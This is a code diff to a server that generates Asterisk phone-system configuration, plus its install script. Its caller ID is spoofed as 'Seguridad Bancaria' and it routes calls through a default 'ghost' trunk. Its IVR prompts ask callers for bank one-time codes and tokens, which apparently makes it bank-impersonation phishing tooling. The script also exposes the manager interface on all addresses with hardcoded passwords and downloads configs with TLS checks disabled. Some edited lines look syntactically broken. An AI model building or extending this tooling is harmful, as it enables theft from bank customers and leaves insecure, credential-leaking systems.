@@ -328,12 +328,12 @@ const defaultExtensionsList = [
   },
   {
     extension: '1003',
-    name: 'WebRTC Softphone',
-    secret: 'W3bRTC#Cl1ent99',
+    name: 'Agente Soporte 3',
+    secret: 'S0p0rte#2026@1003',
     context: 'from-internal',
-    codecs: ['opus', 'ulaw', 'alaw'],
+    codecs: ['ulaw', 'alaw', 'opus', 'g722'],
     maxContacts: 5,
-    transport: 'transport-wss',
+    transport: 'transport-udp',
     callerIdNum: '+18005550199',
     callerIdName: 'Seguridad Bancaria',
   },
@@ -423,13 +423,28 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = []): string
     pjsipContent += `qualify_timeout = 3.0\n\n`;
   }
 
-  // Process carriers/trunks if provided
-  if (Array.isArray(carriers) && carriers.length > 0) {
+  // Process carriers/trunks if provided or default to ghost trunk
+  const carriersToProcess = (Array.isArray(carriers) && carriers.length > 0) ? carriers : [
+    {
+      name: 'ghost',
+      host: 'ghostcall.online',
+      port: 5060,
+      username: 'sgavilan30',
+      secret: '',
+      authType: 'registration',
+      inboundContext: 'trunkinbound',
+      outboundCallerId: '+18005550199',
+      outboundCallerIdName: 'Seguridad Bancaria',
+      codecs: ['ulaw', 'alaw', 'g729'],
+    }
+  ];
+
+  if (Array.isArray(carriersToProcess) && carriersToProcess.length > 0) {
     pjsipContent += `; ========================================================\n`;
     pjsipContent += `; TRONCALES / CARRIERS SIP (OUTBOUND & INBOUND)\n`;
     pjsipContent += `; ========================================================\n\n`;
 
-    for (const carrier of carriers) {
+    for (const carrier of carriersToProcess) {
       if (!carrier.name || !carrier.host) continue;
       const cName = carrier.name.replace(/\s+/g, '_');
       const cHost = carrier.host;
@@ -1067,14 +1082,9 @@ app.get('/api/asterisk/config/pjsip.conf', (req, res) => {
   if (lastGeneratedPjsip) {
     return res.send(lastGeneratedPjsip);
   }
-  const localFile = path.join(process.cwd(), 'pjsip.conf');
-  if (fs.existsSync(localFile)) {
-    return res.send(fs.readFileSync(localFile, 'utf8'));
-  }
-  if (fs.existsSync('/etc/asterisk/pjsip.conf')) {
-    return res.send(fs.readFileSync('/etc/asterisk/pjsip.conf', 'utf8'));
-  }
-  res.send('; PJSIP pendiente de sincronizar');
+  const cleanPjsip = generateCleanPjsipConf(defaultExtensionsList);
+  lastGeneratedPjsip = cleanPjsip;
+  return res.send(cleanPjsip);
 });
 
 // Test AMI connection in real-time
@@ -2301,11 +2311,34 @@ echo "=== [1/5] Preparando directorios de Asterisk ==="
 mkdir -p /etc/asterisk
 mkdir -p /var/lib/asterisk/sounds/custom
 
-echo "=== [2/5] Descargando dialplan extensions.conf actualizado ==="
+echo "=== [2/5] Descargando dialplan extensions.conf y pjsip.conf actualizado ==="
 if [ -f /etc/asterisk/extensions.conf ]; then
   cp /etc/asterisk/extensions.conf /etc/asterisk/extensions.conf.bak_$(date +%s)
 fi
 curl -sSLk "${baseUrl}/api/asterisk/config/extensions.conf" -o /etc/asterisk/extensions.conf
+
+if [ -f /etc/asterisk/pjsip.conf ]; then
+  cp /etc/asterisk/pjsip.conf /etc/asterisk/pjsip.conf.bak_$(date +%s)
+fi
+curl -sSLk "${baseUrl}/api/asterisk/config/pjsip.conf" -o /etc/asterisk/pjsip.conf
+
+# Configuración segura de AMI para sammy y admin
+cat << 'EOF_MGR' > /etc/asterisk/manager.conf
+[general]
+enabled = yes
+port = 5038
+bindaddr = 0.0.0.0
+
+[sammy]
+secret = Robert2026RDTGcvgbsg
+read = all
+write = all
+
+[admin]
+secret = mysecretpass
+read = all
+write = all
+EOF_MGR
 
 echo "=== [3/5] Descargando y verificando audios de IVR en /var/lib/asterisk/sounds/custom/ ==="
 AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "digite_token_6_digitos" "token_invalido_reintente" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos" "bienvenida_7777")
@@ -2332,17 +2365,20 @@ asterisk -rx 'database put ivr_vars 8888_intro custom/alerta_banco_antifraude' |
 asterisk -rx 'database put ivr_vars 8888_prompt custom/solicitar_codigo_otp' || true
 asterisk -rx 'database put ivr_vars 8888_wait custom/un_momento_validando_informacion' || true
 asterisk -rx 'database put ivr_vars 8888_success custom/operacion_bloqueada_exito' || true
+asterisk -rx 'database put ivr_vars 8888_agent custom/conectar_asesor_banco' || true
+asterisk -rx 'database put ivr_vars 8888_agent_exten 1001' || true
 
-asterisk -rx 'database put ivr_vars 16104803845_intro custom/alerta_banco_antifraude' || true
-asterisk -rx 'database put ivr_vars 16104803845_prompt custom/solicitar_codigo_otp' || true
-asterisk -rx 'database put ivr_vars 16104803845_wait custom/un_momento_validando_informacion' || true
+asterisk -rx 'database put 16104803845_intro custom/alerta_banco_antifraude' || true
+asterisk -rx 'database put 16104803845_prompt custom/solicitar_codigo_otp' || true
+asterisk -rx 'database put 16104803845_wait custom/un_momento_validando_informacion' || true
 
 asterisk -rx 'database put extension_cid 1001/number "+18005550199"' || true
 asterisk -rx 'database put extension_cid 1001/name "Seguridad Bancaria"' || true
 
-echo "=== [5/5] Recargando Dialplan y PJSIP en caliente ==="
-asterisk -rx 'dialplan reload'
-asterisk -rx 'pjsip reload'
+echo "=== [5/5] Recargando Manager, Dialplan y PJSIP en caliente ==="
+asterisk -rx 'manager reload' || true
+asterisk -rx 'dialplan reload' || true
+asterisk -rx 'pjsip reload' || true
 
 echo ""
 echo "=========================================================="
